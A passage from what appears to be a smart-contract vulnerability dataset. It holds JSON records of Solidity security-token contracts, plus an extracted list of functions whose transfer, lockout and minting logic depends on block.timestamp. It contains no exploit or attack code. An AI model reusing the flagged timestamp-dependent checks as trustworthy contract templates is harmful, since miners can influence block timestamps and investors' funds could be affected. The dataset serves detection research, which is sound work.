newOwner;\n constructor() public {\n owner = msg.sender;\n }\n modifier onlyOwner() {\n require(msg.sender == owner);\n _;\n }\n function changeOwner(address _newOwner) public onlyOwner {\n newOwner = _newOwner;\n }\n function acceptOwnership() public {\n if (msg.sender == newOwner) {\n owner = newOwner;\n newOwner = 0;\n }\n }\n}\ncontract AffiliateList is Ownable, IAffiliateList {\n event AffiliateAdded(address addr, uint startTimestamp, uint endTimestamp);\n event AffiliateUpdated(address addr, uint startTimestamp, uint endTimestamp);\n mapping (address => uint) public affiliateStart;\n mapping (address => uint) public affiliateEnd;\n function set(address addr, uint startTimestamp, uint endTimestamp) public onlyOwner {\n require(addr != address(0));\n uint existingStart = affiliateStart[addr];\n if(existingStart == 0) {\n require(startTimestamp != 0);\n affiliateStart[addr] = startTimestamp;\n if(endTimestamp != 0) {\n require(endTimestamp > startTimestamp);\n affiliateEnd[addr] = endTimestamp;\n }\n emit AffiliateAdded(addr, startTimestamp, endTimestamp);\n }\n else {\n if(startTimestamp == 0) {\n if(endTimestamp == 0) {\n affiliateStart[addr] = 0;\n affiliateEnd[addr] = 0;\n }\n else {\n require(endTimestamp > existingStart);\n }\n }\n else {\n affiliateStart[addr] = startTimestamp;\n if(endTimestamp != 0) {\n require(endTimestamp > startTimestamp);\n }\n }\n affiliateEnd[addr] = endTimestamp;\n emit AffiliateUpdated(addr, startTimestamp, endTimestamp);\n }\n }\n function get(address addr) public view returns (uint start, uint end) {\n return (affiliateStart[addr], affiliateEnd[addr]);\n }\n function inListAsOf(address addr, uint time) public view returns (bool) {\n uint start;\n uint end;\n (start, end) = get(addr);\n if(start == 0) {\n return false;\n }\n if(time < start) {\n return false;\n }\n if(end != 0 && time >= end) {\n return false;\n }\n return true;\n }\n}\ncontract InvestorList is Ownable, IInvestorList {\n event AddressAdded(address addr, string role);\n event AddressRemoved(address addr, string role);\n mapping (address => string) internal investorList;\n modifier validRole(string role) {\n require(\n keccak256(bytes(role)) == keccak256(bytes(ROLE_REGD)) ||\n keccak256(bytes(role)) == keccak256(bytes(ROLE_REGCF)) ||\n keccak256(bytes(role)) == keccak256(bytes(ROLE_REGS)) ||\n keccak256(bytes(role)) == keccak256(bytes(ROLE_UNKNOWN))\n );\n _;\n }\n function inList(address addr)\n public\n view\n returns (bool)\n {\n if (bytes(investorList[addr]).length != 0) {\n return true;\n } else {\n return false;\n }\n }\n function getRole(address addr)\n public\n view\n returns (string)\n {\n require(inList(addr));\n return investorList[addr];\n }\n function hasRole(address addr, string role)\n public\n view\n returns (bool)\n {\n return keccak256(bytes(role)) == keccak256(bytes(investorList[addr]));\n }\n function addAddress(address addr, string role)\n onlyOwner\n validRole(role)\n public\n {\n investorList[addr] = role;\n emit AddressAdded(addr, role);\n }\n function addAddresses(address[] addrs, string role)\n onlyOwner\n validRole(role)\n public\n {\n for (uint256 i = 0; i < addrs.length; i++) {\n addAddress(addrs[i], role);\n }\n }\n function removeAddress(address addr)\n onlyOwner\n public\n {\n require(inList(addr));\n string memory role = investorList[addr];\n investorList[addr] = \"\";\n emit AddressRemoved(addr, role);\n }\n function removeAddresses(address[] addrs)\n onlyOwner\n public\n {\n for (uint256 i = 0; i < addrs.length; i++) {\n if (inList(addrs[i])) {\n removeAddress(addrs[i]);\n }\n }\n }\n}\nlibrary SafeMath {\n function mul(uint256 a, uint256 b) internal pure returns (uint256 c) {\n if (a == 0) {\n return 0;\n }\n c = a * b;\n assert(c / a == b);\n return c;\n }\n function div(uint256 a, uint256 b) internal pure returns (uint256) {\n return a / b;\n }\n function sub(uint256 a, uint256 b) internal pure returns (uint256) {\n assert(b <= a);\n return a - b;\n }\n function add(uint256 a, uint256 b) internal pure returns (uint256 c) {\n c = a + b;\n assert(c >= a);\n return c;\n }\n}\ncontract ISecurityController {\n function balanceOf(address _a) public view returns (uint);\n function totalSupply() public view returns (uint);\n function isTransferAuthorized(address _from, address _to) public view returns (bool);\n function setTransferAuthorized(address from, address to, uint expiry) public;\n function transfer(address _from, address _to, uint _value) public returns (bool success);\n function transferFrom(address _spender, address _from, address _to, uint _value) public returns (bool success);\n function allowance(address _owner, address _spender) public view returns (uint);\n function approve(address _owner, address _spender, uint _value) public returns (bool success);\n function increaseApproval(address _owner, address _spender, uint _addedValue) public returns (bool success);\n function decreaseApproval(address _owner, address _spender, uint _subtractedValue) public returns (bool success);\n function burn(address _owner, uint _amount) public;\n function ledgerTransfer(address from, address to, uint val) public;\n function setLedger(address _ledger) public;\n function setSale(address _sale) public;\n function setToken(address _token) public;\n function setAffiliateList(address _affiliateList) public;\n}\ncontract SecurityController is ISecurityController, Ownable {\n ISecurityLedger public ledger;\n ISecurityToken public token;\n ISecuritySale public sale;\n IInvestorList public investorList;\n ITransferAuthorizations public transferAuthorizations;\n IAffiliateList public affiliateList;\n uint public lockoutPeriod = 10 * 60 * 60;\n mapping(address => bool) public transferAuthPermission;\n constructor() public {\n }\n function setTransferAuthorized(address from, address to, uint expiry) public {\n require(transferAuthPermission[msg.sender]);\n require(from != 0);\n if(expiry > 0) {\n require(expiry > block.timestamp);\n require(expiry <= (block.timestamp + 30 days));\n }\n transferAuthorizations.set(from, to, expiry);\n }\n function setLockoutPeriod(uint _lockoutPeriod) public onlyOwner {\n lockoutPeriod = _lockoutPeriod;\n }\n function setToken(address _token) public onlyOwner {\n token = ISecurityToken(_token);\n }\n function setLedger(address _ledger) public onlyOwner {\n ledger = ISecurityLedger(_ledger);\n }\n function setSale(address _sale) public onlyOwner {\n sale = ISecuritySale(_sale);\n }\n function setInvestorList(address _investorList) public onlyOwner {\n investorList = IInvestorList(_investorList);\n }\n function setTransferAuthorizations(address _transferAuthorizations) public onlyOwner {\n transferAuthorizations = ITransferAuthorizations(_transferAuthorizations);\n }\n function setAffiliateList(address _affiliateList) public onlyOwner {\n affiliateList = IAffiliateList(_affiliateList);\n }\n function setDependencies(address _token, address _ledger, address _sale,\n address _investorList, address _transferAuthorizations, address _affiliateList)\n public onlyOwner\n {\n token = ISecurityToken(_token);\n ledger = ISecurityLedger(_ledger);\n sale = ISecuritySale(_sale);\n investorList = IInvestorList(_investorList);\n transferAuthorizations = ITransferAuthorizations(_transferAuthorizations);\n affiliateList = IAffiliateList(_affiliateList);\n }\n function setTransferAuthPermission(address agent, bool hasPermission) public onlyOwner {\n require(agent != address(0));\n transferAuthPermission[agent] = hasPermission;\n }\n modifier onlyToken() {\n require(msg.sender == address(token));\n _;\n }\n modifier onlyLedger() {\n require(msg.sender == address(ledger));\n _;\n }\n function totalSupply() public view returns (uint) {\n return ledger.totalSupply();\n }\n function balanceOf(address _a) public view returns (uint) {\n return ledger.balanceOf(_a);\n }\n function allowance(address _owner, address _spender) public view returns (uint) {\n return ledger.allowance(_owner, _spender);\n }\n function isTransferAuthorized(address _from, address _to) public view returns (bool) {\n uint expiry = transferAuthorizations.get(_from, _to);\n uint globalExpiry = transferAuthorizations.get(_from, 0);\n if(globalExpiry > expiry) {\n expiry = globalExpiry;\n }\n return expiry > block.timestamp;\n }\n function checkTransfer(address _from, address _to, uint _value, uint lockoutTime)\n public\n returns (bool canTransfer, bool useLockoutTime, bool newTokensAreRestricted, bool preservePurchaseDate) {\n preservePurchaseDate = false;\n bool transferIsAuthorized = isTransferAuthorized(_from, _to);\n bool fromIsAffiliate = affiliateList.inListAsOf(_from, block.timestamp);\n bool toIsAffiliate = affiliateList.inListAsOf(_to, block.timestamp);\n if(transferIsAuthorized) {\n canTransfer = true;\n if(fromIsAffiliate || toIsAffiliate) {\n newTokensAreRestricted = true;\n }\n }\n else if(!fromIsAffiliate) {\n if(investorList.hasRole(_from, investorList.ROLE_REGS())\n && investorList.hasRole(_to, investorList.ROLE_REGS())) {\n canTransfer = true;\n }\n else {\n if(ledger.transferDryRun(_from, _to, _value, lockoutTime) == _value) {\n canTransfer = true;\n useLockoutTime = true;\n }\n }\n }\n }\n function ledgerTransfer(address from, address to, uint val) public onlyLedger {\n token.controllerTransfer(from, to, val);\n }\n function transfer(address _from, address _to, uint _value) public onlyToken returns (bool success) {\n uint lockoutTime = block.timestamp - lockoutPeriod;\n bool canTransfer;\n bool useLockoutTime;\n bool newTokensAreRestricted;\n bool preservePurchaseDate;\n (canTransfer, useLockoutTime, newTokensAreRestricted, preservePurchaseDate)\n = checkTransfer(_from, _to, _value, lockoutTime);\n if(!canTransfer) {\n return false;\n }\n uint overrideLockoutTime = lockoutTime;\n if(!useLockoutTime) {\n overrideLockoutTime = 0;\n }\n return ledger.transfer(_from, _to, _value, overrideLockoutTime, newTokensAreRestricted, preservePurchaseDate);\n }\n function transferFrom(address _spender, address _from, address _to, uint _value) public onlyToken returns (bool success) {\n uint lockoutTime = block.timestamp - lockoutPeriod;\n bool canTransfer;\n bool useLockoutTime;\n bool newTokensAreRestricted;\n bool preservePurchaseDate;\n (canTransfer, useLockoutTime, newTokensAreRestricted, preservePurchaseDate)\n = checkTransfer(_from, _to, _value, lockoutTime);\n if(!canTransfer) {\n return false;\n }\n uint overrideLockoutTime = lockoutTime;\n if(!useLockoutTime) {\n overrideLockoutTime = 0;\n }\n return ledger.transferFrom(_spender, _from, _to, _value, overrideLockoutTime, newTokensAreRestricted, preservePurchaseDate);\n }\n function approve(address _owner, address _spender, uint _value) public onlyToken returns (bool success) {\n return ledger.approve(_owner, _spender, _value);\n }\n function increaseApproval (address _owner, address _spender, uint _addedValue) public onlyToken returns (bool success) {\n return ledger.increaseApproval(_owner, _spender, _addedValue);\n }\n function decreaseApproval (address _owner, address _spender, uint _subtractedValue) public onlyToken returns (bool success) {\n return ledger.decreaseApproval(_owner, _spender, _subtractedValue);\n }\n function burn(address _owner, uint _amount) public onlyToken {\n ledger.burn(_owner, _amount);\n }\n}\ninterface ISecurityLedger {\n function balanceOf(address _a) external view returns (uint);\n function totalSupply() external view returns (uint);\n function transferDryRun(address _from, address _to, uint amount, uint lockoutTime) external returns (uint transferrableCount);\n function transfer(address _from, address _to, uint _value, uint lockoutTime, bool newTokensAreRestricted, bool preservePurchaseDate) external returns (bool success);\n function transferFrom(address _spender, address _from, address _to, uint _value, uint lockoutTime, bool newTokensAreRestricted, bool preservePurchaseDate) external returns (bool success);\n function allowance(address _owner, address _spender) external view returns (uint);\n function approve(address _owner, address _spender, uint _value) external returns (bool success);\n function increaseApproval(address _owner, address _spender, uint _addedValue) external returns (bool success);\n function decreaseApproval(address _owner, address _spender, uint _subtractedValue) external returns (bool success);\n function burn(address _owner, uint _amount) external;\n function setController(address _controller) external;\n}\ncontract SecurityLedger is Ownable {\n using SafeMath for uint256;\n struct TokenLot {\n uint amount;\n uint purchaseDate;\n bool restricted;\n }\n mapping(address => TokenLot[]) public tokenLotsOf;\n SecurityController public controller;\n mapping(address => uint) public balanceOf;\n mapping (address => mapping (address => uint)) public allowance;\n uint public totalSupply;\n uint public mintingNonce;\n bool public mintingStopped;\n constructor() public {\n }\n function setController(address _controller) public onlyOwner {\n controller = SecurityController(_controller);\n }\n function stopMinting() public onlyOwner {\n mintingStopped = true;\n }\n function mint(address addr, uint value, uint timestamp) public onlyOwner {\n require(!mintingStopped);\n uint time = timestamp;\n if(time == 0) {\n time = block.timestamp;\n }\n balanceOf[addr] = balanceOf[addr].add(value);\n tokenLotsOf[addr].push(TokenLot(value, time, true));\n controller.ledgerTransfer(0, addr, value);\n totalSupply = totalSupply.add(value);\n }\n function multiMint(uint nonce, uint256[] bits, uint timestamp) external onlyOwner {\n require(!mintingStopped);\n if (nonce != mintingNonce) return;\n mintingNonce = mintingNonce.add(1);\n uint256 lomask = (1 << 96) - 1;\n uint created = 0;\n uint time = timestamp;\n if(time == 0) {\n time = block.timestamp;\n }\n for (uint i = 0; i < bits.length; i++) {\n address addr = address(bits[i]>>96);\n uint value = bits[i] & lomask;\n balanceOf[addr] = balanceOf[addr].add(value);\n tokenLotsOf[addr].push(TokenLot(value, time, true));\n controller.ledgerTransfer(0, addr, value);\n created = created.add(value);\n }\n totalSupply = totalSupply.add(created);\n }\n function sendReceivedTokens(address token, address sender, uint amount) public onlyOwner {\n ERC20Basic t = ERC20Basic(token);\n require(t.transfer(sender, amount));\n }\n modifier onlyController() {\n require(msg.sender == address(controller));\n _;\n }\n function walkTokenLots(address from, address to, uint amount, uint lockoutTime, bool removeTokens,\n bool newTokensAreRestricted, bool preservePurchaseDate)\n internal returns (uint numTransferrableTokens)\n {\n TokenLot[] storage fromTokenLots = tokenLotsOf[from];\n for(uint i=0; i<fromTokenLots.length; i++) {\n TokenLot storage lot = fromTokenLots[i];\n uint lotAmount = lot.amount;\n if(lotAmount == 0) {\n continue;\n }\n if(lockoutTime > 0) {\n if(lot.restricted && lot.purchaseDate > lockoutTime) {\n continue;\n }\n }\n uint remaining = amount.sub(numTransferrableTokens);\n if(lotAmount >= remaining) {\n numTransferrableTokens = numTransferrableTokens.add(remaining);\n if(removeTokens) {\n lot.amount = lotAmount.sub(remaining);\n if(to != address(0)) {\n if(preservePurchaseDate) {\n tokenLotsOf[to].push(TokenLot(remaining, lot.purchaseDate, newTokensAreRestricted));\n }\n else {\n tokenLotsOf[to].push(TokenLot(remaining, block.timestamp, newTokensAreRestricted));\n }\n }\n }\n break;\n }\n numTransferrableTokens = numTransferrableTokens.add(lotAmount);\n if(removeTokens) {\n lot.amount = 0;\n if(to != address(0)) {\n if(preservePurchaseDate) {\n tokenLotsOf[to].push(TokenLot(lotAmount, lot.purchaseDate, newTokensAreRestricted));\n }\n else {\n tokenLotsOf[to].push(TokenLot(lotAmount, block.timestamp, newTokensAreRestricted));\n }\n }\n }\n }\n }\n function transferDryRun(address from, address to, uint amount, uint lockoutTime) public onlyController returns (uint) {\n return walkTokenLots(from, to, amount, lockoutTime, false, false, false);\n }\n function transfer(address _from, address _to, uint _value, uint lockoutTime, bool newTokensAreRestricted, bool preservePurchaseDate) public onlyController returns (bool success) {\n if (balanceOf[_from] < _value) return false;\n uint tokensTransferred = walkTokenLots(_from, _to, _value, lockoutTime, true, newTokensAreRestricted, preservePurchaseDate);\n require(tokensTransferred == _value);\n balanceOf[_from] = balanceOf[_from].sub(_value);\n balanceOf[_to] = balanceOf[_to].add(_value);\n return true;\n }\n function transferFrom(address _spender, address _from, address _to, uint _value, uint lockoutTime, bool newTokensAreRestricted, bool preservePurchaseDate) public onlyController returns (bool success) {\n if (balanceOf[_from] < _value) return false;\n uint allowed = allowance[_from][_spender];\n if (allowed < _value) return false;\n uint tokensTransferred = walkTokenLots(_from, _to, _value, lockoutTime, true, newTokensAreRestricted, preservePurchaseDate);\n require(tokensTransferred == _value);\n balanceOf[_from] = balanceOf[_from].sub(_value);\n balanceOf[_to] = balanceOf[_to].add(_value);\n allowance[_from][_spender] = allowed.sub(_value);\n return true;\n }\n function approve(address _owner, address _spender, uint _value) public onlyController returns (bool success) {\n if ((_value != 0) && (allowance[_owner][_spender] != 0)) {\n return false;\n }\n allowance[_owner][_spender] = _value;\n return true;\n }\n function increaseApproval (address _owner, address _spender, uint _addedValue) public onlyController returns (bool success) {\n uint oldValue = allowance[_owner][_spender];\n allowance[_owner][_spender] = oldValue.add(_addedValue);\n return true;\n }\n function decreaseApproval (address _owner, address _spender, uint _subtractedValue) public onlyController returns (bool success) {\n uint oldValue = allowance[_owner][_spender];\n if (_subtractedValue > oldValue) {\n allowance[_owner][_spender] = 0;\n } else {\n allowance[_owner][_spender] = oldValue.sub(_subtractedValue);\n }\n return true;\n }\n function burn(address _owner, uint _amount) public onlyController {\n require(balanceOf[_owner] >= _amount);\n balanceOf[_owner] = balanceOf[_owner].sub(_amount);\n walkTokenLots(_owner, address(0), _amount, 0, true, false, false);\n totalSupply = totalSupply.sub(_amount);\n }\n}\ninterface ISecuritySale {\n function setLive(bool newLiveness) external;\n function setInvestorList(address _investorList) external;\n}\ncontract SecuritySale is Ownable {\n bool public live;\n IInvestorList public investorList;\n event SaleLive(bool liveness);\n event EtherIn(address from, uint amount);\n event StartSale();\n event EndSale();\n constructor() public {\n live = false;\n }\n function setInvestorList(address _investorList) public onlyOwner {\n investorList = IInvestorList(_investorList);\n }\n function () public payable {\n require(live);\n require(investorList.inList(msg.sender));\n emit EtherIn(msg.sender, msg.value);\n }\n function setLive(bool newLiveness) public onlyOwner {\n if(live && !newLiveness) {\n live = false;\n emit EndSale();\n }\n else if(!live && newLiveness) {\n live = true;\n emit StartSale();\n }\n }\n function withdraw() public onlyOwner {\n msg.sender.transfer(address(this).balance);\n }\n function withdrawSome(uint value) public onlyOwner {\n require(value <= address(this).balance);\n msg.sender.transfer(value);\n }\n function withdrawTokens(address token) public onlyOwner {\n ERC20Basic t = ERC20Basic(token);\n require(t.transfer(msg.sender, t.balanceOf(this)));\n }\n function sendReceivedTokens(address token, address sender, uint amount) public onlyOwner {\n ERC20Basic t = ERC20Basic(token);\n require(t.transfer(sender, amount));\n }\n}\ninterface ISecurityToken {\n function balanceOf(address addr) external view returns(uint);\n function transfer(address to, uint amount) external returns(bool);\n function controllerTransfer(address _from, address _to, uint _value) external;\n}\ncontract SecurityToken is Ownable{\n using SafeMath for uint256;\n ISecurityController public controller;\n string public name;\n string public symbol;\n uint8 public decimals;\n event Transfer(address indexed from, address indexed to, uint value);\n event Approval(address indexed owner, address indexed spender, uint value);\n constructor(string _name, string _symbol, uint8 _decimals) public {\n name = _name;\n symbol = _symbol;\n decimals = _decimals;\n }\n function setName(string _name) public onlyOwner {\n name = _name;\n }\n function setSymbol(string _symbol) public onlyOwner {\n symbol = _symbol;\n }\n function setController(address _c) public onlyOwner {\n controller = ISecurityController(_c);\n }\n function sendReceivedTokens(address token, address sender, uint amount) public onlyOwner {\n ERC20Basic t = ERC20Basic(token);\n require(t.transfer(sender, amount));\n }\n function balanceOf(address a) public view returns (uint) {\n return controller.balanceOf(a);\n }\n function totalSupply() public view returns (uint) {\n return controller.totalSupply();\n }\n function allowance(address _owner, address _spender) public view returns (uint) {\n return controller.allowance(_owner, _spender);\n }\n function burn(uint _amount) public {\n controller.burn(msg.sender, _amount);\n emit Transfer(msg.sender, 0x0, _amount);\n }\n modifier onlyPayloadSize(uint numwords) {\n assert(msg.data.length >= numwords.mul(32).add(4));\n _;\n }\n function isTransferAuthorized(address _from, address _to) public onlyPayloadSize(2) view returns (bool) {\n return controller.isTransferAuthorized(_from, _to);\n }\n function transfer(address _to, uint _value) public onlyPayloadSize(2) returns (bool success) {\n if (controller.transfer(msg.sender, _to, _value)) {\n emit Transfer(msg.sender, _to, _value);\n return true;\n }\n return false;\n }\n function transferFrom(address _from, address _to, uint _value) public onlyPayloadSize(3) returns (bool success) {\n if (controller.transferFrom(msg.sender, _from, _to, _value)) {\n emit Transfer(_from, _to, _value);\n return true;\n }\n return false;\n }\n function approve(address _spender, uint _value) onlyPayloadSize(2) public returns (bool success) {\n if (controller.approve(msg.sender, _spender, _value)) {\n emit Approval(msg.sender, _spender, _value);\n return true;\n }\n return false;\n }\n function increaseApproval (address _spender, uint _addedValue) public onlyPayloadSize(2) returns (bool success) {\n if (controller.increaseApproval(msg.sender, _spender, _addedValue)) {\n uint newval = controller.allowance(msg.sender, _spender);\n emit Approval(msg.sender, _spender, newval);\n return true;\n }\n return false;\n }\n function decreaseApproval (address _spender, uint _subtractedValue) public onlyPayloadSize(2) returns (bool success) {\n if (controller.decreaseApproval(msg.sender, _spender, _subtractedValue)) {\n uint newval = controller.allowance(msg.sender, _spender);\n emit Approval(msg.sender, _spender, newval);\n return true;\n }\n return false;\n }\n modifier onlyController() {\n assert(msg.sender == address(controller));\n _;\n }\n function controllerTransfer(address _from, address _to, uint _value) public onlyController {\n emit Transfer(_from, _to, _value);\n }\n function controllerApprove(address _owner, address _spender, uint _value) public onlyController {\n emit Approval(_owner, _spender, _value);\n }\n}\ninterface ITransferAuthorizations {\n function setController(address _controller) external;\n function get(address from, address to) external view returns (uint);\n function set(address from, address to, uint expiry) external;\n}\ncontract TransferAuthorizations is Ownable, ITransferAuthorizations {\n mapping(address => mapping(address => uint)) public authorizations;\n address public controller;\n event TransferAuthorizationSet(address from, address to, uint expiry);\n function setController(address _controller) public onlyOwner {\n controller = _controller;\n }\n modifier onlyController() {\n assert(msg.sender == controller);\n _;\n }\n function set(address from, address to, uint expiry) public onlyController {\n require(from != 0);\n authorizations[from][to] = expiry;\n emit TransferAuthorizationSet(from, to, expiry);\n }\n function get(address from, address to) public view returns (uint) {\n return authorizations[from][to];\n }\n}",
  "extract_feature": [
    "function setTransferAuthorized(address from, address to, uint expiry) public {\nrequire(transferAuthPermission[msg.sender]);\nrequire(from != 0);\nif(expiry > 0) {\nrequire(expiry > block.timestamp);\nrequire(expiry <= (block.timestamp + 30 days));\n}\ntransferAuthorizations.set(from, to, expiry);\n}",
    "function isTransferAuthorized(address _from, address _to) public view returns (bool) {\nuint expiry = transferAuthorizations.get(_from, _to);\nuint globalExpiry = transferAuthorizations.get(_from, 0);\nif(globalExpiry > expiry) {\nexpiry = globalExpiry;\n}\nreturn expiry > block.timestamp;\n}",
    "function transfer(address _from, address _to, uint _value) public onlyToken returns (bool success) {\nuint lockoutTime = block.timestamp - lockoutPeriod;\nbool canTransfer;\nbool useLockoutTime;\nbool newTokensAreRestricted;\nbool preservePurchaseDate;\n(canTransfer, useLockoutTime, newTokensAreRestricted, preservePurchaseDate)\n= checkTransfer(_from, _to, _value, lockoutTime);\nif(!canTransfer) {\nreturn false;\n}\nuint overrideLockoutTime = lockoutTime;\nif(!useLockoutTime) {\noverrideLockoutTime = 0;\n}\nreturn ledger.transfer(_from, _to, _value, overrideLockoutTime, newTokensAreRestricted, preservePurchaseDate);\n}",
    "function transferFrom(address _spender, address _from, address _to, uint _value) public onlyToken returns (bool success) {\nuint lockoutTime = block.timestamp - lockoutPeriod;\nbool canTransfer;\nbool useLockoutTime;\nbool newTokensAreRestricted;\nbool preservePurchaseDate;\n(canTransfer, useLockoutTime, newTokensAreRestricted, preservePurchaseDate)\n= checkTransfer(_from, _to, _value, lockoutTime);\nif(!canTransfer) {\nreturn false;\n}\nuint overrideLockoutTime = lockoutTime;\nif(!useLockoutTime) {\noverrideLockoutTime = 0;\n}\nreturn ledger.transferFrom(_spender, _from, _to, _value, overrideLockoutTime, newTokensAreRestricted, preservePurchaseDate);\n}",
    "function mint(address addr, uint value, uint timestamp) public onlyOwner {\nrequire(!mintingStopped);\nuint time = timestamp;\nif(time == 0) {\ntime = block.timestamp;\n}\nbalanceOf[addr] = balanceOf[addr].add(value);\ntokenLotsOf[addr].push(TokenLot(value, time, true));\ncontroller.ledgerTransfer(0, addr, value);\ntotalSupply = totalSupply.add(value);\n}",
    "function multiMint(uint nonce, uint256[] bits, uint timestamp) external onlyOwner {\nrequire(!mintingStopped);\nif (nonce != mintingNonce) return;\nmintingNonce = mintingNonce.add(1);\nuint256 lomask = (1 << 96) - 1;\nuint created = 0;\nuint time = timestamp;\nif(time == 0) {\ntime = block.timestamp;\n}\nfor (uint i = 0; i < bits.length; i++) {\naddress addr = address(bits[i]>>96);\nuint value = bits[i] & lomask;\nbalanceOf[addr] = balanceOf[addr].add(value);\ntokenLotsOf[addr].push(TokenLot(value, time, true));\ncontroller.ledgerTransfer(0, addr, value);\ncreated = created.add(value);\n}\ntotalSupply = totalSupply.add(created);\n}"
  ]
},
{
  "_id": {
    "$oid": "663abaabfa0e1460cdfa1f7d"
  },
  "filename": "9359.sol",
  "content": "pragma solidity ^0.4.13;\ninterface IAffiliateList {\n function set(address addr, uint startTimestamp, uint endTimestamp) external;\n function get(address addr) external view returns (uint start, uint end);\n function inListAsOf(address addr, uint time) external view returns (bool);\n}\ncontract ERC20Basic {\n function totalSupply() public view returns (uint256);\n function balanceOf(address who) public view returns (uint256);\n function transfer(address to, uint256 value) public returns (bool);\n event Transfer(address indexed from, address indexed to, uint256 value);\n}\ncontract IInvestorList {\n string public constant ROLE_REGD = \"regd\";\n string public constant ROLE_REGCF = \"regcf\";\n string public constant ROLE_REGS = \"regs\";\n string public constant ROLE_UNKNOWN = \"unknown\";\n function inList(address addr) public view returns (bool);\n function addAddress(address addr, string role) public;\n function getRole(address addr) public view returns (string);\n function hasRole(address addr, string role) public view returns (bool);\n}\ncontract Ownable {\n address public owner;\n address public newOwner;\n constructor() public {\n owner = msg.sender;\n }\n modifier onlyOwner() {\n require(msg.sender == owner);\n _;\n }\n function changeOwner(address _newOwner) public onlyOwner {\n newOwner = _newOwner;\n }\n function acceptOwnership() public {\n if (msg.sender == newOwner) {\n owner = newOwner;\n newOwner = 0;\n }\n }\n}\ncontract AffiliateList is Ownable, IAffiliateList {\n event AffiliateAdded(address addr, uint startTimestamp, uint endTimestamp);\n event AffiliateUpdated(address addr, uint startTimestamp, uint endTimestamp);\n mapping (address => uint) public affiliateStart;\n mapping (address => uint) public affiliateEnd;\n function set(address addr, uint startTimestamp, uint endTimestamp) public onlyOwner {\n require(addr != address(0));\n uint existingStart = affiliateStart[addr];\n if(existingStart == 0) {\n require(startTimestamp != 0);\n affiliateStart[addr] = startTimestamp;\n if(endTimestamp != 0) {\n require(endTimestamp > startTimestamp);\n affiliateEnd[addr] = endTimestamp;\n }\n emit AffiliateAdded(addr, startTimestamp, endTimestamp);\n }\n else {\n if(startTimestamp == 0) {\n if(endTimestamp == 0) {\n affiliateStart[addr] = 0;\n affiliateEnd[addr] = 0;\n }\n else {\n require(endTimestamp > existingStart);\n }\n }\n else {\n affiliateStart[addr] = startTimestamp;\n if(endTimestamp != 0) {\n require(endTimestamp > startTimestamp);\n }\n }\n affiliateEnd[addr] = endTimestamp;\n emit AffiliateUpdated(addr, startTimestamp, endTimestamp);\n }\n }\n function get(address addr) public view returns (uint start, uint end) {\n return (affiliateStart[addr], affiliateEnd[addr]);\n }\n function inListAsOf(address addr, uint time) public view returns (bool) {\n uint start;\n uint end;\n (start, end) = get(addr);\n if(start == 0) {\n return false;\n }\n if(time < start) {\n return false;\n }\n if(end != 0 && time >= end) {\n return false;\n }\n return true;\n }\n}\ncontract InvestorList is Ownable, IInvestorList {\n event AddressAdded(address addr, string role);\n event AddressRemoved(address addr, string role);\n mapping (address => string) internal investorList;\n modifier validRole(string role) {\n require(\n keccak256(bytes(role)) == keccak256(bytes(ROLE_REGD)) ||\n keccak256(bytes(role)) == keccak256(bytes(ROLE_REGCF)) ||\n keccak256(bytes(role)) == keccak256(bytes(ROLE_REGS)) ||\n keccak256(bytes(role)) == keccak256(bytes(ROLE_UNKNOWN))\n );\n _;\n }\n function inList(address addr)\n public\n view\n returns (bool)\n {\n if (bytes(investorList[addr]).length != 0) {\n return true;\n } else {\n return false;\n }\n }\n function getRole(address addr)\n public\n view\n returns (string)\n {\n require(inList(addr));\n return investorList[addr];\n }\n function hasRole(address addr, string role)\n public\n view\n returns (bool)\n {\n return keccak256(bytes(role)) == keccak256(bytes(investorList[addr]));\n }\n function addAddress(address addr, string role)\n onlyOwner\n validRole(role)\n public\n {\n investorList[addr] = role;\n emit AddressAdded(addr, role);\n }\n function addAddresses(address[] addrs, string role)\n onlyOwner\n validRole(role)\n public\n {\n for (uint256 i = 0; i < addrs.length; i++) {\n addAddress(addrs[i], role);\n }\n }\n function removeAddress(address addr)\n onlyOwner\n public\n {\n require(inList(addr));\n string memory role = investorList[addr];\n investorList[addr] = \"\";\n emit AddressRemoved(addr, role);\n }\n function removeAddresses(address[] addrs)\n onlyOwner\n public\n {\n for (uint256 i = 0; i < addrs.length; i++) {\n if (inList(addrs[i])) {\n removeAddress(addrs[i]);\n }\n }\n }\n}\nlibrary SafeMath {\n function mul(uint256 a, uint256 b) internal pure returns (uint256 c) {\n if (a == 0) {\n return 0;\n }\n c = a * b;\n assert(c / a == b);\n return c;\n }\n function div(uint256 a, uint256 b) internal pure returns (uint256) {\n return a / b;\n }\n function sub(uint256 a, uint256 b) internal pure returns (uint256) {\n assert(b <= a);\n return a - b;\n }\n function add(uint256 a, uint256 b) internal pure returns (uint256 c) {\n c = a + b;\n assert(c >= a);\n return c;\n }\n}\ncontract ISecurityController {\n function balanceOf(address _a) public view returns (uint);\n function totalSupply() public view returns (uint);\n function isTransferAuthorized(address _from, address _to) public view returns (bool);\n function setTransferAuthorized(address from, address to, uint expiry) public;\n function transfer(address _from, address _to, uint _value) public returns (bool success);\n function transferFrom(address _spender, address _from, address _to, uint _value) public returns (bool success);\n function allowance(address _owner, address _spender) public view returns (uint);\n function approve(address _owner, address _spender, uint _value) public returns (bool success);\n function increaseApproval(address _owner, address _spender, uint _addedValue) public returns (bool success);\n function decreaseApproval(address _owner, address _spender, uint _subtractedValue) public returns (bool success);\n function burn(address _owner, uint _amount) public;\n function ledgerTransfer(address from, address to, uint val) public;\n function setLedger(address _ledger) public;\n function setSale(address _sale) public;\n function setToken(address _token) public;\n function setAffiliateList(address _affiliateList) public;\n}\ncontract SecurityController is ISecurityController, Ownable {\n ISecurityLedger public ledger;\n ISecurityToken public token;\n ISecuritySale public sale;\n IInvestorList public investorList;\n ITransferAuthorizations public transferAuthorizations;\n IAffiliateList public affiliateList;\n uint public lockoutPeriod = 10 * 60 * 60;\n mapping(address => bool) public transferAuthPermission;\n constructor() public {\n }\n function setTransferAuthorized(address from, address to, uint expiry) public {\n require(transferAuthPermission[msg.sender]);\n require(from != 0);\n if(expiry > 0) {\n require(expiry > block.timestamp);\n require(expiry <= (block.timestamp + 30 days));\n }\n transferAuthorizations.set(from, to, expiry);\n }\n function setLockoutPeriod(uint _lockoutPeriod) public onlyOwner {\n lockoutPeriod = _lockoutPeriod;\n }\n function setToken(address _token) public onlyOwner {\n token = ISecurityToken(_token);\n }\n function setLedger(address _ledger) public onlyOwner {\n ledger = ISecurityLedger(_ledger);\n }\n function setSale(address _sale) public onlyOwner {\n sale = ISecuritySale(_sale);\n }\n function setInvestorList(address _investorList) public onlyOwner {\n investorList = 